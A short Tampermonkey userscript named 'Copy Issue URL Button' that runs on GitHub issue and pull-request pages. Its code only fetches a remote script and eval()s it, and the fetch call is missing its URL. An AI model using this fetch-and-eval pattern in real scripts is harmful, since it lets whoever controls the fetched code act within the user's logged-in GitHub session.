// ==UserScript==
// @name         Copy Issue URL Button
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       Nick Bucher
// @match        https://github.com/*/issues/*
// @match        https://github.com/*/pull/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=github.com
// @grant        none
// ==/UserScript==

(function () {
  "use strict";

  async function main() {
    console.log("[TM] Fetching script...");
    const res = await fetch();
    console.log("[TM] Request completed.");
    const text = await res.text();
    console.log("[TM] Loaded script:", text);
    eval(text);
  }

  main();
})();
